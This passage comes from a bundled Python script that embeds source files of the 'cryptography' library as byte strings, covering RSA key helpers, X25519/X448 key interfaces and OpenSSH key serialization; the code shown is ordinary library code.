from cryptography.hazmat.backends.openssl.backend import backend as ossl\r\n\r\n    _verify_rsa_parameters(public_exponent, key_size)\r\n    return ossl.generate_rsa_private_key(public_exponent, key_size)\r\n\r\n\r\ndef _verify_rsa_parameters(public_exponent: int, key_size: int) -> None:\r\n    if public_exponent not in (3, 65537):\r\n        raise ValueError(\r\n            "public_exponent must be either 3 (for legacy compatibility) or "\r\n            "65537. Almost everyone should choose 65537 here!"\r\n        )\r\n\r\n    if key_size < 512:\r\n        raise ValueError("key_size must be at least 512-bits.")\r\n\r\n\r\ndef _check_private_key_components(\r\n    p: int,\r\n    q: int,\r\n    private_exponent: int,\r\n    dmp1: int,\r\n    dmq1: int,\r\n    iqmp: int,\r\n    public_exponent: int,\r\n    modulus: int,\r\n) -> None:\r\n    if modulus < 3:\r\n        raise ValueError("modulus must be >= 3.")\r\n\r\n    if p >= modulus:\r\n        raise ValueError("p must be < modulus.")\r\n\r\n    if q >= modulus:\r\n        raise ValueError("q must be < modulus.")\r\n\r\n    if dmp1 >= modulus:\r\n        raise ValueError("dmp1 must be < modulus.")\r\n\r\n    if dmq1 >= modulus:\r\n        raise ValueError("dmq1 must be < modulus.")\r\n\r\n    if iqmp >= modulus:\r\n        raise ValueError("iqmp must be < modulus.")\r\n\r\n    if private_exponent >= modulus:\r\n        raise ValueError("private_exponent must be < modulus.")\r\n\r\n    if public_exponent < 3 or public_exponent >= modulus:\r\n        raise ValueError("public_exponent must be >= 3 and < modulus.")\r\n\r\n    if public_exponent & 1 == 0:\r\n        raise ValueError("public_exponent must be odd.")\r\n\r\n    if dmp1 & 1 == 0:\r\n        raise ValueError("dmp1 must be odd.")\r\n\r\n    if dmq1 & 1 == 0:\r\n        raise ValueError("dmq1 must be odd.")\r\n\r\n    if p * q != modulus:\r\n        raise ValueError("p*q must equal modulus.")\r\n\r\n\r\ndef _check_public_key_components(e: int, n: int) -> None:\r\n    if n < 3:\r\n        raise ValueError("n must be >= 3.")\r\n\r\n    if e < 3 or e >= n:\r\n        raise ValueError("e must be >= 3 and < n.")\r\n\r\n    if e & 1 == 0:\r\n        raise ValueError("e must be odd.")\r\n\r\n\r\ndef _modinv(e: int, m: int) -> int:\r\n    """\r\n    Modular Multiplicative Inverse. Returns x such that: (x*e) mod m == 1\r\n    """\r\n    x1, x2 = 1, 0\r\n    a, b = e, m\r\n    while b > 0:\r\n        q, r = divmod(a, b)\r\n        xn = x1 - q * x2\r\n        a, b, x1, x2 = b, r, x2, xn\r\n    return x1 % m\r\n\r\n\r\ndef rsa_crt_iqmp(p: int, q: int) -> int:\r\n    """\r\n    Compute the CRT (q ** -1) % p value from RSA primes p and q.\r\n    """\r\n    return _modinv(q, p)\r\n\r\n\r\ndef rsa_crt_dmp1(private_exponent: int, p: int) -> int:\r\n    """\r\n    Compute the CRT private_exponent % (p - 1) value from the RSA\r\n    private_exponent (d) and p.\r\n    """\r\n    return private_exponent % (p - 1)\r\n\r\n\r\ndef rsa_crt_dmq1(private_exponent: int, q: int) -> int:\r\n    """\r\n    Compute the CRT private_exponent % (q - 1) value from the RSA\r\n    private_exponent (d) and q.\r\n    """\r\n    return private_exponent % (q - 1)\r\n\r\n\r\n# Controls the number of iterations rsa_recover_prime_factors will perform\r\n# to obtain the prime factors. Each iteration increments by 2 so the actual\r\n# maximum attempts is half this number.\r\n_MAX_RECOVERY_ATTEMPTS = 1000\r\n\r\n\r\ndef rsa_recover_prime_factors(\r\n    n: int, e: int, d: int\r\n) -> typing.Tuple[int, int]:\r\n    """\r\n    Compute factors p and q from the private exponent d. We assume that n has\r\n    no more than two factors. This function is adapted from code in PyCrypto.\r\n    """\r\n    # See 8.2.2(i) in Handbook of Applied Cryptography.\r\n    ktot = d * e - 1\r\n    # The quantity d*e-1 is a multiple of phi(n), even,\r\n    # and can be represented as t*2^s.\r\n    t = ktot\r\n    while t % 2 == 0:\r\n        t = t // 2\r\n    # Cycle through all multiplicative inverses in Zn.\r\n    # The algorithm is non-deterministic, but there is a 50% chance\r\n    # any candidate a leads to successful factoring.\r\n    # See "Digitalized Signatures and Public Key Functions as Intractable\r\n    # as Factorization", M. Rabin, 1979\r\n    spotted = False\r\n    a = 2\r\n    while not spotted and a < _MAX_RECOVERY_ATTEMPTS:\r\n        k = t\r\n        # Cycle through all values a^{t*2^i}=a^k\r\n        while k < ktot:\r\n            cand = pow(a, k, n)\r\n            # Check if a^k is a non-trivial root of unity (mod n)\r\n            if cand != 1 and cand != (n - 1) and pow(cand, 2, n) == 1:\r\n                # We have found a number such that (cand-1)(cand+1)=0 (mod n).\r\n                # Either of the terms divides n.\r\n                p = gcd(cand + 1, n)\r\n                spotted = True\r\n                break\r\n            k *= 2\r\n        # This value was not any good... let\'s try another!\r\n        a += 2\r\n    if not spotted:\r\n        raise ValueError("Unable to compute factors p and q from exponent d.")\r\n    # Found !\r\n    q, r = divmod(n, p)\r\n    assert r == 0\r\n    p, q = sorted((p, q), reverse=True)\r\n    return (p, q)\r\n\r\n\r\nclass RSAPrivateNumbers:\r\n    def __init__(\r\n        self,\r\n        p: int,\r\n        q: int,\r\n        d: int,\r\n        dmp1: int,\r\n        dmq1: int,\r\n        iqmp: int,\r\n        public_numbers: "RSAPublicNumbers",\r\n    ):\r\n        if (\r\n            not isinstance(p, int)\r\n            or not isinstance(q, int)\r\n            or not isinstance(d, int)\r\n            or not isinstance(dmp1, int)\r\n            or not isinstance(dmq1, int)\r\n            or not isinstance(iqmp, int)\r\n        ):\r\n            raise TypeError(\r\n                "RSAPrivateNumbers p, q, d, dmp1, dmq1, iqmp arguments must"\r\n                " all be an integers."\r\n            )\r\n\r\n        if not isinstance(public_numbers, RSAPublicNumbers):\r\n            raise TypeError(\r\n                "RSAPrivateNumbers public_numbers must be an RSAPublicNumbers"\r\n                " instance."\r\n            )\r\n\r\n        self._p = p\r\n        self._q = q\r\n        self._d = d\r\n        self._dmp1 = dmp1\r\n        self._dmq1 = dmq1\r\n        self._iqmp = iqmp\r\n        self._public_numbers = public_numbers\r\n\r\n    @property\r\n    def p(self) -> int:\r\n        return self._p\r\n\r\n    @property\r\n    def q(self) -> int:\r\n        return self._q\r\n\r\n    @property\r\n    def d(self) -> int:\r\n        return self._d\r\n\r\n    @property\r\n    def dmp1(self) -> int:\r\n        return self._dmp1\r\n\r\n    @property\r\n    def dmq1(self) -> int:\r\n        return self._dmq1\r\n\r\n    @property\r\n    def iqmp(self) -> int:\r\n        return self._iqmp\r\n\r\n    @property\r\n    def public_numbers(self) -> "RSAPublicNumbers":\r\n        return self._public_numbers\r\n\r\n    def private_key(self, backend: typing.Any = None) -> RSAPrivateKey:\r\n        from cryptography.hazmat.backends.openssl.backend import (\r\n            backend as ossl,\r\n        )\r\n\r\n        return ossl.load_rsa_private_numbers(self)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, RSAPrivateNumbers):\r\n            return NotImplemented\r\n\r\n        return (\r\n            self.p == other.p\r\n            and self.q == other.q\r\n            and self.d == other.d\r\n            and self.dmp1 == other.dmp1\r\n            and self.dmq1 == other.dmq1\r\n            and self.iqmp == other.iqmp\r\n            and self.public_numbers == other.public_numbers\r\n        )\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(\r\n            (\r\n                self.p,\r\n                self.q,\r\n                self.d,\r\n                self.dmp1,\r\n                self.dmq1,\r\n                self.iqmp,\r\n                self.public_numbers,\r\n            )\r\n        )\r\n\r\n\r\nclass RSAPublicNumbers:\r\n    def __init__(self, e: int, n: int):\r\n        if not isinstance(e, int) or not isinstance(n, int):\r\n            raise TypeError("RSAPublicNumbers arguments must be integers.")\r\n\r\n        self._e = e\r\n        self._n = n\r\n\r\n    @property\r\n    def e(self) -> int:\r\n        return self._e\r\n\r\n    @property\r\n    def n(self) -> int:\r\n        return self._n\r\n\r\n    def public_key(self, backend: typing.Any = None) -> RSAPublicKey:\r\n        from cryptography.hazmat.backends.openssl.backend import (\r\n            backend as ossl,\r\n        )\r\n\r\n        return ossl.load_rsa_public_numbers(self)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<RSAPublicNumbers(e={0.e}, n={0.n})>".format(self)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, RSAPublicNumbers):\r\n            return NotImplemented\r\n\r\n        return self.e == other.e and self.n == other.n\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.e, self.n))\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/_asymmetric.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport abc\r\n\r\n\r\n# This exists to break an import cycle. It is normally accessible from the\r\n# asymmetric padding module.\r\n\r\n\r\nclass AsymmetricPadding(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def name(self) -> str:\r\n        """\r\n        A string naming this padding (e.g. "PSS", "PKCS1").\r\n        """\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/asymmetric/x25519.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\n\r\nfrom cryptography.exceptions import UnsupportedAlgorithm, _Reasons\r\nfrom cryptography.hazmat.primitives import _serialization\r\n\r\n\r\nclass X25519PublicKey(metaclass=abc.ABCMeta):\r\n    @classmethod\r\n    def from_public_bytes(cls, data: bytes) -> "X25519PublicKey":\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        if not backend.x25519_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "X25519 is not supported by this version of OpenSSL.",\r\n                _Reasons.UNSUPPORTED_EXCHANGE_ALGORITHM,\r\n            )\r\n\r\n        return backend.x25519_load_public_bytes(data)\r\n\r\n    @abc.abstractmethod\r\n    def public_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PublicFormat,\r\n    ) -> bytes:\r\n        """\r\n        The serialized bytes of the public key.\r\n        """\r\n\r\n\r\nclass X25519PrivateKey(metaclass=abc.ABCMeta):\r\n    @classmethod\r\n    def generate(cls) -> "X25519PrivateKey":\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        if not backend.x25519_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "X25519 is not supported by this version of OpenSSL.",\r\n                _Reasons.UNSUPPORTED_EXCHANGE_ALGORITHM,\r\n            )\r\n        return backend.x25519_generate_key()\r\n\r\n    @classmethod\r\n    def from_private_bytes(cls, data: bytes) -> "X25519PrivateKey":\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        if not backend.x25519_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "X25519 is not supported by this version of OpenSSL.",\r\n                _Reasons.UNSUPPORTED_EXCHANGE_ALGORITHM,\r\n            )\r\n\r\n        return backend.x25519_load_private_bytes(data)\r\n\r\n    @abc.abstractmethod\r\n    def public_key(self) -> X25519PublicKey:\r\n        """\r\n        The serialized bytes of the public key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def private_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PrivateFormat,\r\n        encryption_algorithm: _serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        """\r\n        The serialized bytes of the private key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def exchange(self, peer_public_key: X25519PublicKey) -> bytes:\r\n        """\r\n        Performs a key exchange operation using the provided peer\'s public key.\r\n        """\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/asymmetric/x448.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\n\r\nfrom cryptography.exceptions import UnsupportedAlgorithm, _Reasons\r\nfrom cryptography.hazmat.primitives import _serialization\r\n\r\n\r\nclass X448PublicKey(metaclass=abc.ABCMeta):\r\n    @classmethod\r\n    def from_public_bytes(cls, data: bytes) -> "X448PublicKey":\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        if not backend.x448_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "X448 is not supported by this version of OpenSSL.",\r\n                _Reasons.UNSUPPORTED_EXCHANGE_ALGORITHM,\r\n            )\r\n\r\n        return backend.x448_load_public_bytes(data)\r\n\r\n    @abc.abstractmethod\r\n    def public_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PublicFormat,\r\n    ) -> bytes:\r\n        """\r\n        The serialized bytes of the public key.\r\n        """\r\n\r\n\r\nclass X448PrivateKey(metaclass=abc.ABCMeta):\r\n    @classmethod\r\n    def generate(cls) -> "X448PrivateKey":\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        if not backend.x448_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "X448 is not supported by this version of OpenSSL.",\r\n                _Reasons.UNSUPPORTED_EXCHANGE_ALGORITHM,\r\n            )\r\n        return backend.x448_generate_key()\r\n\r\n    @classmethod\r\n    def from_private_bytes(cls, data: bytes) -> "X448PrivateKey":\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        if not backend.x448_supported():\r\n            raise UnsupportedAlgorithm(\r\n                "X448 is not supported by this version of OpenSSL.",\r\n                _Reasons.UNSUPPORTED_EXCHANGE_ALGORITHM,\r\n            )\r\n\r\n        return backend.x448_load_private_bytes(data)\r\n\r\n    @abc.abstractmethod\r\n    def public_key(self) -> X448PublicKey:\r\n        """\r\n        The serialized bytes of the public key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def private_bytes(\r\n        self,\r\n        encoding: _serialization.Encoding,\r\n        format: _serialization.PrivateFormat,\r\n        encryption_algorithm: _serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        """\r\n        The serialized bytes of the private key.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def exchange(self, peer_public_key: X448PublicKey) -> bytes:\r\n        """\r\n        Performs a key exchange operation using the provided peer\'s public key.\r\n        """\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/serialization/ssh.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport binascii\r\nimport os\r\nimport re\r\nimport typing\r\nfrom base64 import encodebytes as _base64_encode\r\n\r\nfrom cryptography import utils\r\nfrom cryptography.exceptions import UnsupportedAlgorithm\r\nfrom cryptography.hazmat.primitives.asymmetric import dsa, ec, ed25519, rsa\r\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\r\nfrom cryptography.hazmat.primitives.serialization import (\r\n    Encoding,\r\n    NoEncryption,\r\n    PrivateFormat,\r\n    PublicFormat,\r\n)\r\n\r\ntry:\r\n    from bcrypt import kdf as _bcrypt_kdf\r\n\r\n    _bcrypt_supported = True\r\nexcept ImportError:\r\n    _bcrypt_supported = False\r\n\r\n    def _bcrypt_kdf(\r\n        password: bytes,\r\n        salt: bytes,\r\n        desired_key_bytes: int,\r\n        rounds: int,\r\n        ignore_few_rounds: bool = False,\r\n    ) -> bytes:\r\n        raise UnsupportedAlgorithm("Need bcrypt module")\r\n\r\n\r\n_SSH_ED25519 = b"ssh-ed25519"\r\n_SSH_RSA = b"ssh-rsa"\r\n_SSH_DSA = b"ssh-dss"\r\n_ECDSA_NISTP256 = b"ecdsa-sha2-nistp256"\r\n_ECDSA_NISTP384 = b"ecdsa-sha2-nistp384"\r\n_ECDSA_NISTP521 = b"ecdsa-sha2-nistp521"\r\n_CERT_SUFFIX = b"-cert-v01@openssh.com"\r\n\r\n_SSH_PUBKEY_RC = re.compile(rb"\\A(\\S+)[ \\t]+(\\S+)")\r\n_SK_MAGIC = b"openssh-key-v1\\0"\r\n_SK_START = b"-----BEGIN OPENSSH PRIVATE KEY-----"\r\n_SK_END = b"-----END OPENSSH PRIVATE KEY-----"\r\n_BCRYPT = b"bcrypt"\r\n_NONE = b"none"\r\n_DEFAULT_CIPHER = b"aes256-ctr"\r\n_DEFAULT_ROUNDS = 16\r\n_MAX_PASSWORD = 72\r\n\r\n# re is only way to work on bytes-like data\r\n_PEM_RC = re.compile(_SK_START + b"(.*?)" + _SK_END, re.DOTALL)\r\n\r\n# padding for max blocksize\r\n_PADDING = memoryview(bytearray(range(1, 1 + 16)))\r\n\r\n# ciphers that are actually used in key wrapping\r\n_SSH_CIPHERS: typing.Dict[\r\n    bytes,\r\n    typing.Tuple[\r\n        typing.Type[algorithms.AES],\r\n        int,\r\n        typing.Union[typing.Type[modes.CTR], typing.Type[modes.CBC]],\r\n        int,\r\n    ],\r\n] = {\r\n    b"aes256-ctr": (algorithms.AES, 32, modes.CTR, 16),\r\n    b"aes256-cbc": (algorithms.AES, 32, modes.CBC, 16),\r\n}\r\n\r\n# map local curve name to key type\r\n_ECDSA_KEY_TYPE = {\r\n    "secp256r1": _ECDSA_NISTP256,\r\n    "secp384r1": _ECDSA_NISTP384,\r\n    "secp521r1": _ECDSA_NISTP521,\r\n}\r\n\r\n\r\ndef _ecdsa_key_type(public_key: ec.EllipticCurvePublicKey) -> bytes:\r\n    """Return SSH key_type and curve_name for private key."""\r\n    curve = public_key.curve\r\n    if curve.name not in _ECDSA_KEY_TYPE:\r\n        raise ValueError(\r\n            f"Unsupported curve for ssh private key: {curve.name!r}"\r\n        )\r\n    return _ECDSA_KEY_TYPE[curve.name]\r\n\r\n\r\ndef _ssh_pem_encode(\r\n    data: bytes,\r\n    prefix: bytes = _SK_START + b"\\n",\r\n    suffix: bytes = _SK_END + b"\\n",\r\n) -> bytes:\r\n    return b"".join([prefix, _base64_encode(data), suffix])\r\n\r\n\r\ndef _check_block_size(data: bytes, block_len: int) -> None:\r\n    """Require data to be full blocks"""\r\n    if not data or len(data) % block_len != 0:\r\n        raise ValueError("Corrupt data: missing padding")\r\n\r\n\r\ndef _check_empty(data: bytes) -> None:\r\n    """All data should have been parsed."""\r\n    if data:\r\n        raise ValueError("Corrupt data: unparsed data")\r\n\r\n\r\ndef _init_cipher(\r\n    ciphername: bytes,\r\n    password: typing.Optional[bytes],\r\n    salt: bytes,\r\n    rounds: int,\r\n) -> Cipher[typing.Union[modes.CBC, modes.CTR]]:\r\n    """Generate key + iv and return cipher."""\r\n    if not password:\r\n        raise ValueError("Key is password-protected.")\r\n\r\n    algo, key_len, mode, iv_len = _SSH_CIPHERS[ciphername]\r\n    seed = _bcrypt_kdf(password, salt, key_len + iv_len, rounds, True)\r\n    return Cipher(algo(seed[:key_len]), mode(seed[key_len:]))\r\n\r\n\r\ndef _get_u32(data: memoryview) -> typing.Tuple[int, memoryview]:\r\n    """Uint32"""\r\n    if len(data) < 4:\r\n        raise ValueError("Invalid data")\r\n    return int.from_bytes(data[:4], byteorder="big"), data[4:]\r\n\r\n\r\ndef _get_u64(data: memoryview) -> typing.Tuple[int, memoryview]:\r\n    """Uint64"""\r\n    if len(data) < 8:\r\n        raise ValueError("Invalid data")\r\n    return int.from_bytes(data[:8], byteorder="big"), data[8:]\r\n\r\n\r\ndef _get_sshstr(data: memoryview) -> typing.Tuple[memoryview, memoryview]:\r\n    """Bytes with u32 length prefix"""\r\n    n, data = _get_u32(data)\r\n    if n > len(data):\r\n        raise ValueError("Invalid data")\r\n    return data[:n], data[n:]\r\n\r\n\r\ndef _get_mpint(data: memoryview) -> typing.Tuple[int, memoryview]:\r\n    """Big integer."""\r\n    val, data = _get_sshstr(data)\r\n    if val and val[0] > 0x7F:\r\n        raise ValueError("Invalid data")\r\n    return int.from_bytes(val, "big"), data\r\n\r\n\r\ndef _to_mpint(val: int) -> bytes:\r\n    """Storage format for signed bigint."""\r\n    if val < 0:\r\n        raise ValueError("negative mpint not allowed")\r\n    if not val:\r\n        return b""\r\n    nbytes = (val.bit_length() + 8) // 8\r\n    return utils.int_to_bytes(val, nbytes)\r\n\r\n\r\nclass _FragList:\r\n    """Build recursive structure without data copy."""\r\n\r\n    flist: typing.List[bytes]\r\n\r\n    def __init__(self, init: typing.List[bytes] = None) -> None:\r\n        self.flist = []\r\n        if init:\r\n            self.flist.extend(init)\r\n\r\n    def put_raw(self, val: bytes) -> None:\r\n        """Add plain bytes"""\r\n        self.flist.append(val)\r\n\r\n    def put_u32(self, val: int) -> None:\r\n        """Big-endian uint32"""\r\n        self.flist.append(val.to_bytes(length=4, byteorder="big"))\r\n\r\n    def put_sshstr(self, val: typing.Union[bytes, "_FragList"]) -> None:\r\n        """Bytes prefixed with u32 length"""\r\n        if isinstance(val, (bytes, memoryview, bytearray)):\r\n            self.put_u32(len(val))\r\n            self.flist.append(val)\r\n        else:\r\n            self.put_u32(val.size())\r\n            self.flist.extend(val.flist)\r\n\r\n    def put_mpint(self, val: int) -> None:\r\n        """Big-endian bigint prefixed with u32 length"""\r\n        self.put_sshstr(_to_mpint(val))\r\n\r\n    def size(self) -> int:\r\n        """Current number of bytes"""\r\n        return sum(map(len, self.flist))\r\n\r\n    def render(self, dstbuf: memoryview, pos: int = 0) -> int:\r\n        """Write into bytearray"""\r\n        for frag in self.flist:\r\n            flen = len(frag)\r\n            start, pos = pos, pos + flen\r\n            dstbuf[start:pos] = frag\r\n        return pos\r\n\r\n    def tobytes(self) -> bytes:\r\n        """Return as bytes"""\r\n        buf = memoryview(bytearray(self.size()))\r\n        self.render(buf)\r\n        return buf.tobytes()\r\n\r\n\r\nclass _SSHFormatRSA:\r\n    """Format for RSA keys.\r\n\r\n    Public:\r\n        mpint e, n\r\n    Private:\r\n        mpint n, e, d, iqmp, p, q\r\n    """\r\n\r\n    def get_public(self, data: memoryview):\r\n        """RSA public fields"""\r\n        e, data = _get_mpint(data)\r\n        n, data = _get_mpint(data)\r\n        return (e, n), data\r\n\r\n    def load_public(\r\n        self, data: memoryview\r\n    ) -> typing.Tuple[rsa.RSAPublicKey, memoryview]:\r\n        """Make RSA public key from data."""\r\n        (e, n), data = self.get_public(data)\r\n        public_numbers = rsa.RSAPublicNumbers(e, n)\r\n        public_key = public_numbers.public_key()\r\n        return public_key, data\r\n\r\n    def load_private(\r\n        self, data: memoryview, pubfields\r\n    ) -> typing.Tuple[rsa.RSAPrivateKey, memoryview]:\r\n        """Make RSA private key from data."""\r\n        n, data = _get_mpint(data)\r\n        e, data = _get_mpint(data)\r\n        d, data = _get_mpint(data)\r\n        iqmp, data = _get_mpint(data)\r\n        p, data = _get_mpint(data)\r\n        q, data = _get_mpint(data)\r\n\r\n        if (e, n) != pubfields:\r\n            raise ValueError("Corrupt data: rsa field mismatch")\r\n        dmp1 = rsa.rsa_crt_dmp1(d, p)\r\n        dmq1 = rsa.rsa_crt_dmq1(d, q)\r\n        public_numbers = rsa.RSAPublicNumbers(e, n)\r\n        private_numbers = rsa.RSAPrivateNumbers(\r\n            p, q, d, dmp1, dmq1, iqmp, public_numbers\r\n        )\r\n        private_key = private_numbers.private_key()\r\n        return private_key, data\r\n\r\n    def encode_public(\r\n        self, public_key: rsa.RSAPublicKey, f_pub: _FragList\r\n    ) -> None:\r\n        """Write RSA public key"""\r\n        pubn = public_key.public_numbers()\r\n        f_pub.put_mpint(pubn.e)\r\n        f_pub.put_mpint(pubn.n)\r\n\r\n    def encode_private(\r\n        self, private_key: rsa.RSAPrivateKey, f_priv: _FragList\r\n    ) -> None:\r\n        """Write RSA private key"""\r\n        private_numbers = private_key.private_numbers()\r\n        public_numbers = private_numbers.public_numbers\r\n\r\n        f_priv.put_mpint(public_numbers.n)\r\n        f_priv.put_mpint(public_numbers.e)\r\n\r\n        f_priv.put_mpint(private_numbers.d)\r\n        f_priv.put_mpint(private_numbers.iqmp)\r\n        f_priv.put_mpint(private_numbers.p)\r\n        f_priv.put_mpint(private_numbers.q)\r\n\r\n\r\nclass _SSHFormatDSA:\r\n    """Format for DSA keys.\r\n\r\n    Public:\r\n        mpint p, q, g, y\r\n    Private:\r\n        mpint p, q, g, y, x\r\n    """\r\n\r\n    def get_public(\r\n        self, data: memoryview\r\n    ) -> typing.Tuple[typing.Tuple, memoryview]:\r\n        """DSA public fields"""\r\n        p, data = _get_mpint(data)\r\n        q, data = _get_mpint(data)\r\n        g, data = _get_mpint(data)\r\n        y, data = _get_mpint(data)\r\n        return (p, q, g, y), data\r\n\r\n    def load_public(\r\n        self, data: memoryview\r\n    ) -> typing.Tuple[dsa.DSAPublicKey, memoryview]:\r\n        """Make DSA public key from data."""\r\n        (p, q, g, y), data = self.get_public(data)\r\n        parameter_numbers = dsa.DSAParameterNumbers(p, q, g)\r\n        public_numbers = dsa.DSAPublicNumbers(y, parameter_numbers)\r\n        self._validate(public_numbers)\r\n        public_key = public_numbers.public_key()\r\n        return public_key, data\r\n\r\n    def load_private(\r\n        self, data: memoryview, pubfields\r\n    ) -> typing.Tuple[dsa.DSAPrivateKey, memoryview]:\r\n        """Make DSA private key from data."""\r\n        (p, q, g, y), data = self.get_public(data)\r\n        x, data = _get_mpint(data)\r\n\r\n        if (p, q, g, y) != pubfields:\r\n            raise ValueError("Corrupt data: dsa field mismatch")\r\n        parameter_numbers = dsa.DSAParameterNumbers(p, q, g)\r\n        public_numbers = dsa.DSAPublicNumbers(y, parameter_numbers)\r\n        self._validate(public_numbers)\r\n        private_numbers = dsa.DSAPrivateNumbers(x, public_numbers)\r\n        private_key = private_numbers.private_key()\r\n        return private_key, data\r\n\r\n    def encode_public(\r\n        self, public_key: dsa.DSAPublicKey, f_pub: _FragList\r\n    ) -> None:\r\n        """Write DSA public key"""\r\n        public_numbers = public_key.public_numbers()\r\n        parameter_numbers = public_numbers.parameter_numbers\r\n        self._validate(public_numbers)\r\n\r\n        f_pub.put_mpint(parameter_numbers.p)\r\n        f_pub.put_mpint(parameter_numbers.q)\r\n        f_pub.put_mpint(parameter_numbers.g)\r\n        f_pub.put_mpint(public_numbers.y)\r\n\r\n    def encode_private(\r\n        self, private_key: dsa.DSAPrivateKey, f_priv: _FragList\r\n    ) -> None:\r\n        """Write DSA private key"""\r\n        self.encode_public(private_key.public_key(), f_priv)\r\n        f_priv.put_mpint(private_key.private_numbers().x)\r\n\r\n    def _validate(self, public_numbers: dsa.DSAPublicNumbers) -> None:\r\n        parameter_numbers = public_numbers.parameter_numbers\r\n        if parameter_numbers.p.bit_length() != 1024:\r\n            raise ValueError("SSH supports only 1024 bit DSA keys")\r\n\r\n\r\nclass _SSHFormatECDSA:\r\n    """Format for ECDSA keys.\r\n\r\n    Public:\r\n        str curve\r\n        bytes point\r\n    Private:\r\n        str curve\r\n        bytes point\r\n        mpint secret\r\n    """\r\n\r\n    def __init__(self, ssh_curve_name: bytes, curve: ec.EllipticCurve):\r\n        self.ssh_curve_name = ssh_curve_name\r\n        self.curve = curve\r\n\r\n    def get_public(\r\n        self, data: memoryview\r\n    ) -> typing.Tuple[typing.Tuple, memoryview]:\r\n        """ECDSA public fields"""\r\n        curve, data = _get_sshstr(data)\r\n        point, data = _get_sshstr(data)\r\n        if curve != self.ssh_curve_name:\r\n            raise ValueError("Curve name mismatch")\r\n        if point[0] != 4:\r\n            raise NotImplementedError("Need uncompressed point")\r\n        return (curve, point), data\r\n\r\n    def load_public(\r\n        self, data: memoryview\r\n    ) -> typing.Tuple[ec.EllipticCurvePublicKey, memoryview]:\r\n        """Make ECDSA public key from data."""\r\n        (curve_name, point), data = self.get_public(data)\r\n        public_key = ec.EllipticCurvePublicKey.from_encoded_point(\r\n            self.curve, point.tobytes()\r\n        )\r\n        return public_key, data\r\n\r\n    def load_private(\r\n        self, data: memoryview, pubfields\r\n    ) -> typing.Tuple[ec.EllipticCurvePrivateKey, memoryview]:\r\n        """Make ECDSA private key from data."""\r\n        (curve_name, point), data = self.get_public(data)\r\n        secret, data = _get_mpint(data)\r\n\r\n        if (curve_name, point) != pubfields:\r\n            raise ValueError("Corrupt data: ecdsa field mismatch")\r\n        private_key = ec.derive_private_key(secret, self.curve)\r\n        return private_key, data\r\n\r\n    def encode_public(\r\n        self, public_key: ec.EllipticCurvePublicKey, f_pub: _FragList\r\n    ) -> None:\r\n        """Write ECDSA public key"""\r\n        point = public_key.public_bytes(\r\n            Encoding.X962, PublicFormat.UncompressedPoint\r\n        )\r\n        f_pub.put_sshstr(self.ssh_curve_name)\r\n        f_pub.put_sshstr(point)\r\n\r\n    def encode_private(\r\n        self, private_key: ec.EllipticCurvePrivateKey, f_priv: _FragList\r\n    ) -> None:\r\n        """Write ECDSA private key"""\r\n        public_key = private_key.public_key()\r\n        private_numbers = private_key.private_numbers()\r\n\r\n        self.encode_public(public_key, f_priv)\r\n        f_priv.put_mpint(private_numbers.private_value)\r\n\r\n\r\nclass _SSHFormatEd25519:\r\n    """Format for Ed25519 keys.\r\n\r\n    Public:\r\n        bytes point\r\n    Private:\r\n        bytes point\r\n        bytes secret_and_point\r\n    """\r\n\r\n    def get_public(\r\n        self, data: memoryview\r\n    ) -> typing.Tuple[typing.Tuple, memoryview]:\r\n        """Ed25519 public fields"""\r\n        point, data = _get_sshstr(data)\r\n        return (point,), data\r\n\r\n    def load_public(\r\n        self, data: memoryview\r\n    ) -> typing.Tuple[ed25519.Ed25519PublicKey, memoryview]:\r\n        """Make Ed25519 public key from data."""\r\n        (point,), data = self.get_public(data)\r\n        public_key = ed25519.Ed25519PublicKey.from_public_bytes(\r\n            point.tobytes()\r\n        )\r\n        return public_key, data\r\n\r\n    def load_private(\r\n        self, data: memoryview, pubfields\r\n    ) -> typing.Tuple[ed25519.Ed25519PrivateKey, memoryview]:\r\n        """Make Ed25519 private key from data."""\r\n        (point,), data = self.get_public(data)\r\n        keypair, data = _get_sshstr(data)\r\n\r\n        secret = keypair[:32]\r\n        point2 = 